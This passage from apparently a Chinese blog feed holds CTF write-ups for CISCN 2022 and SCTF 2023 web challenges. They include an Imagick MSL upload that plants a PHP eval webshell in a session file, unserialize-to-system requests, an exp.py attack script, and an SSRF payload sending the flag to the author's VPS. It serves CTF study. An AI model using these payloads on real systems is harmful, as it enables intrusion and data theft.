class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9999</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Content-Length: 703</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=------------------------c32aaddf3d8fd979</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--------------------------c32aaddf3d8fd979</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;swarm&quot;; filename=&quot;swarm.msl&quot;</span></span><br><span class="line"><span class="comment">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="comment">&lt;image&gt;</span></span><br><span class="line"><span class="comment"> &lt;read filename=&quot;inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw/cGhwIGV2YWwoJF9HRVRbMV0pOz8+fE86ODoiYmFja2Rvb3IiOjI6e3M6NDoicGF0aCI7czoxNDoiL3RtcC9zZXNzX2Fma2wiO3M6MTI6ImRvX2V4ZWNfZnVuYyI7YjowO30=&quot; /&gt;</span></span><br><span class="line"><span class="comment"> &lt;write filename=&quot;/tmp/sess_snakin&quot; /&gt;</span></span><br><span class="line"><span class="comment">&lt;/image&gt;</span></span><br><span class="line"><span class="comment">--------------------------c32aaddf3d8fd979--</span></span><br></pre></td></tr></table></figure><p>这里就是强制文件上传    <code>xml</code>这些内容就会上传到<code>/tmp/php*</code>   临时文件下  </p><p>接着因为<code>new imagick(&quot;vid:msl:/tmp/php*&quot;)</code>  初始会执行<code>msl</code>语言，所以临时文件里的内容就会被执行  </p><p>就是将序列化好的字符进行base64编码  然后传入<code>/tmp/sess_snakin</code>下</p><p><img src="../images/image-20230621163522068.png" alt="image-20230621163522068"></p><p>随后使用执行一次任意无参函数的功能，触发<code>session_start</code>函数，并设置<code>cookie</code>为<code>PHPSESSID=snakin</code>，即可文件包含<code>session</code>，成功<code>RCE</code>。<code>flag</code>执行根目录的<code>readflag</code>即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /?data=O%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>backdoor%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">class</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>session_start%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>do_exec_func%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D&amp;cmd=unserialze&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;/readflag&#x27;</span>); HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9999</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Cookie: PHPSESSID=snakin</span></span><br></pre></td></tr></table></figure><p>上面的传的序列化字符就是为了开启<code>session_start()</code>的</p><p><strong>然后就会进行反序列化将path给赋值，反序列化完后再进行序列化，将序列化后的执行存入存储介质中 因为session文件中含有php代码，包含的时候就会执行</strong>  </p><p>上面就是<code>imagick</code>配合<code>session</code>进行rce的过程了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.snakin.top/2022/09/09/2022CISCN%E5%86%B3%E8%B5%9B/&quot;&gt;题目wp&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://swarm.ptsecurity.com/exploiting</summary>
      
    
    
    
    
    <category term="ciscn决赛-2022-backdoor" scheme="https://ke1nys.github.io/tags/ciscn%E5%86%B3%E8%B5%9B-2022-backdoor/"/>
    
  </entry>
  
  <entry>
    <title>sctf-web-2023</title>
    <link href="https://ke1nys.github.io/posts/99a58670.html"/>
    <id>https://ke1nys.github.io/posts/99a58670.html</id>
    <published>2023-06-20T09:28:27.000Z</published>
    <updated>2023-06-24T13:50:21.839Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ezcheck1n"><a href="#ezcheck1n" class="headerlink" title="ezcheck1n"></a><strong>ezcheck1n</strong></h2><p>题目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/hint提示是</span><br><span class="line"></span><br><span class="line">find the way to flag.Looks like there are two containers with an evil P in the configuration file of the frontend server</span><br><span class="line"></span><br><span class="line">去寻找flag在哪</span><br><span class="line"></span><br><span class="line">他看来有两个路由有P在配置文件中</span><br><span class="line"></span><br><span class="line">nss的考点中有</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>后端是 Server: Apache/2.4.54 (Debian) 中间件是 Server: Apache/2.4.55 (Unix)</strong></p><p><strong>这就是题目提示的两个容器的意思</strong></p><p><img src="../images/image-20230620194824661.png" alt="image-20230620194824661"></p><p>但是试了一下  发现不行  就没往这方面想了   没想到的最后wp里还是用它</p><p>(就是在其基础上修改一下就行了)</p><p><img src="../images/image-20230620195107173.png" alt="image-20230620195107173"></p><p><strong>题目就是提示了这几点  <code>post</code>指的是<code>post.jpeg</code>  然后就会看到下面的这个2022</strong></p><p>(就是当时想不明白这个url有啥用。。。。。。。)</p><p>这里的<code>url</code>是用来ssrf然后将flag带出到自己的vps监听端口上</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/2023/1%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0aGET%20/2022.php%3furl%3d101.42.39.110:3389%253fa%253d</span><br></pre></td></tr></table></figure><p>这里的<code>2022.php</code>是猜出来的，因为题目给了是<code>show_source(2023.php)</code>   然后图片给的是2022，使用就是靠这里猜出来的</p><p><img src="../images/image-20230620201530382.png" alt="image-20230620201530382"></p><p><img src="../images/image-20230620201513988.png" alt="image-20230620201513988"></p><h2 id="fumo-backdoor"><a href="#fumo-backdoor" class="headerlink" title="fumo_backdoor"></a>fumo_backdoor</h2><p><strong>题目</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FUMO在你的网站上留下了后门 ᗜˬᗜ，她是怎么使用这个后门的捏？ ᗜˬᗜ（flag 在 /flag）</span><br></pre></td></tr></table></figure><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="keyword">__DIR__</span>.<span class="string">&quot;:/tmp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;FUNC_LIST&quot;</span>, <span class="title function_ invoke__">get_defined_functions</span>());</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fumo_backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            <span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;path) &amp;&amp; </span><br><span class="line">            <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[flag]/m&#x27;</span>, <span class="variable">$this</span>-&gt;path) === <span class="number">0</span></span><br><span class="line">        ) &#123;</span><br><span class="line">            <span class="title function_ invoke__">readfile</span>(<span class="variable">$this</span>-&gt;path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;func;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            <span class="title function_ invoke__">is_string</span>(<span class="variable">$func</span>) &amp;&amp; </span><br><span class="line">            <span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, FUNC_LIST[<span class="string">&quot;internal&quot;</span>])</span><br><span class="line">        ) &#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$argv</span> = <span class="variable language_">$this</span>-&gt;argv;</span><br><span class="line">            <span class="variable">$class</span> = <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line"><span class="class">            </span></span><br><span class="line"><span class="class">            <span class="title">new</span> $<span class="title">class</span>($<span class="title">argv</span>);</span></span><br><span class="line"><span class="class">        &#125;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">$<span class="title">cmd</span> = $<span class="title">_REQUEST</span>[&#x27;<span class="title">cmd</span>&#x27;];</span></span><br><span class="line"><span class="class">$<span class="title">data</span> = $<span class="title">_REQUEST</span>[&#x27;<span class="title">data</span>&#x27;];</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">switch</span> ($<span class="title">cmd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;unserialze&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;rm&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;rm -rf /tmp 2&gt;/dev/null&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ini_set(&#39;open_basedir&#39;, __DIR__.&quot;:/tmp&quot;);</code></p><p>  这里的代码将 <code>open_basedir</code> 配置选项设置为当前目录以及 <code>/tmp</code> 目录，因此 PHP 脚本只能访问当前目录和 <code>/tmp</code> 目录下的文件，无法访问其他目录。</p><p>这道题是根据这个题改的</p><p><a href="https://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md">https://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md</a></p><p><a href="https://www.snakin.top/2022/09/09/2022CISCN%E5%86%B3%E8%B5%9B/">https://www.snakin.top/2022/09/09/2022CISCN%E5%86%B3%E8%B5%9B/</a></p><p><strong>这里的多一嘴来讲讲这个参考的这个<code>backdoor</code></strong>     <a href="https://ke1nys.github.io/posts/869a12bf.html">ciscn决赛-2022-backdoor</a></p><p>稍微改了点，include变为了readdir，因此我们很难getshell。那就改变思路了。首先我们知道flag是在根目录的，但是由于open_basedir我们并没有权限去读取，因此我们需要配合imagick的msl语言特性，把flag读到/tmp目录下，然后再利用上述payload去触发__sleep，读取flag文件<br>首先我们需要用如下payload把flag移动到tmp目录下</p><p><strong>先去触发<code>phpinfo</code>()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fumo_backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fumo_backdoor</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621164501671.png" alt="image-20230621164501671"></p><p>开启了<code>imagick</code>扩展</p><p><strong>思路</strong></p><ul><li>先进行临时文件上传 然后创建一个session_xxx文件，然后imagick初始化的时候会执行临时文件里的内容如何值就会赋给session_xxx文件</li></ul><p>(<strong>这里会创建两个文件，一个用来存序列化的数据(这里的path必须是第二次session的名字)，为了给path赋值，另一个是为了存flag</strong>)</p><ul><li>第二步还是进行临时文件上传  然后还是创建一个文件(必须和第一次不同名字)  内容是将flag移到该文件中   就是移到第二步设置的文件中</li></ul><ul><li>第三步进行session_start()的开启   来触发第一次session的反序列化(<strong>为了设置path,反序列化结束后会接着会序列</strong>)  然后可以读取到flag了</li></ul><p>因为这里的是公共容器，会容易被删除自己刚创建的session文件  所以需要python脚本</p><p><strong>exp.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://47.99.77.113:18080/?cmd=unserialze&quot;</span></span><br><span class="line"><span class="comment"># url = &quot;http://127.0.0.1:18080/?cmd=unserialze&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sleep</span>():</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(sys.argv[<span class="number">1</span>] == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">    <span class="comment"># rm</span></span><br><span class="line">    r = requests.get(<span class="string">&quot;http://47.99.77.113:18080/?cmd=rm&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line">    sleep()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># file write</span></span><br><span class="line">    r = requests.post(url, data=&#123;<span class="string">&quot;data&quot;</span>:<span class="string">&#x27;O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;s:17:&quot;vid:msl:/tmp/php*&quot;;s:4:&quot;func&quot;;N;s:5:&quot;class&quot;;s:7:&quot;Imagick&quot;;&#125;&#x27;</span>&#125;, files=&#123;<span class="string">&quot;file1&quot;</span>:<span class="built_in">open</span>(<span class="string">&quot;lfi.xml&quot;</span>).read()&#125;,headers=&#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=tel&quot;</span>&#125;)</span><br><span class="line">    sleep()</span><br><span class="line">    <span class="comment"># file write</span></span><br><span class="line">    r = requests.post(url, data=&#123;<span class="string">&quot;data&quot;</span>:<span class="string">&#x27;O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;s:17:&quot;vid:msl:/tmp/php*&quot;;s:4:&quot;func&quot;;N;s:5:&quot;class&quot;;s:7:&quot;Imagick&quot;;&#125;&#x27;</span>&#125;, files=&#123;<span class="string">&quot;file1&quot;</span>:<span class="built_in">open</span>(<span class="string">&quot;lfi.xml&quot;</span>).read()&#125;,headers=&#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=tel&quot;</span>&#125;)</span><br><span class="line">    sleep()</span><br><span class="line">    r = requests.post(url, data=&#123;<span class="string">&quot;data&quot;</span>:<span class="string">&#x27;O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;s:17:&quot;vid:msl:/tmp/php*&quot;;s:4:&quot;func&quot;;N;s:5:&quot;class&quot;;s:7:&quot;Imagick&quot;;&#125;&#x27;</span>&#125;, files=&#123;<span class="string">&quot;file1&quot;</span>:<span class="built_in">open</span>(<span class="string">&quot;hack.xml&quot;</span>).read()&#125;,headers=&#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=tel&quot;</span>&#125;)</span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># session_start</span></span><br><span class="line">sleep()</span><br><span class="line">r = requests.post(url, data=&#123;<span class="string">&quot;data&quot;</span>:<span class="string">&#x27;O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;N;s:4:&quot;func&quot;;s:13:&quot;session_start&quot;;s:5:&quot;class&quot;;N;&#125;&#x27;</span>&#125;, headers=&#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=tel&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="comment"># session_start</span></span><br><span class="line">sleep()</span><br><span class="line">r = requests.post(url, data=&#123;<span class="string">&quot;data&quot;</span>:<span class="string">&#x27;O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;N;s:4:&quot;func&quot;;s:13:&quot;session_start&quot;;s:5:&quot;class&quot;;N;&#125;&#x27;</span>&#125;, headers=&#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=tel&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><strong>hack.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">read</span> <span class="attr">filename</span>=<span class="string">&quot;inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8P3BocCBldmFsKCRfR0VUWzFdKTs/PnxPOjEzOiJmdW1vX2JhY2tkb29yIjozOntzOjQ6InBhdGgiO3M6OToiL3RtcC9GTEFHIjtzOjQ6ImFyZ3YiO047czoxOiJjIjtOO30=&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">write</span> <span class="attr">filename</span>=<span class="string">&quot;/tmp/sess_tel&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621180951791.png" alt="image-20230621180951791"></p><p><strong>lfi.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">read</span> <span class="attr">filename</span>=<span class="string">&quot;app1:/flag&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">write</span> <span class="attr">filename</span>=<span class="string">&quot;/tmp/FLAG&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621182457074.png" alt="image-20230621182457074"></p><p><strong>这里用那个<code>mvg</code>  <code>app1</code>   <code>uyvy</code> 能直接读取flag</strong></p><p>还有一种办法就是fuzz测试来测试哪种可以用来使用</p><h2 id="pypyp"><a href="#pypyp" class="headerlink" title="pypyp?"></a>pypyp?</h2><h3 id="提示-hint"><a href="#提示-hint" class="headerlink" title="提示/hint"></a>提示/hint</h3><p>a piece of cake but hard work。per 5 min restart.<br>pay attention to <code>/app/app.py</code></p><p><img src="../images/image-20230621201841266.png" alt="image-20230621201841266"></p><p>题目的页面就是这样</p><p>这里的话是先使用 <code>PHP_SESSION_UPLOAD_PROGRESS</code> (<strong>后面跟的是上传内容</strong>)  来强制<code>session start</code></p><p>在使用 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 时，如果 <code>session</code> 没有开启，系统会自动开启一个新的 session。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://115.239.215.75:8081/ -H &quot;Cookie: PHPSESSID=tel&quot; -F &#x27;PHP_SESSION_UPLOAD_PROGRESS=111&#x27;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621203954292.png" alt="image-20230621203954292"></p><p>然后交给gpt就行了</p><p><strong>得到源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Session not started&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$type</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"><span class="variable">$properties</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;properties&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$properties</span>) &amp;&amp; <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>)))&#123;</span><br><span class="line">    <span class="variable">$object</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>));</span><br><span class="line">    <span class="variable">$object</span>-&gt;<span class="title function_ invoke__">sctf</span>();</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$properties</span>))&#123;</span><br><span class="line">    <span class="variable">$object</span> = <span class="keyword">new</span> <span class="variable">$type</span>(<span class="variable">$properties</span>[<span class="number">0</span>], <span class="variable">$properties</span>[<span class="number">1</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$object</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;http://127.0.0.1:5000/&#x27;</span> . <span class="variable">$properties</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;this is the object: <span class="subst">$object</span>&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://115.239.215.75:8081/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span 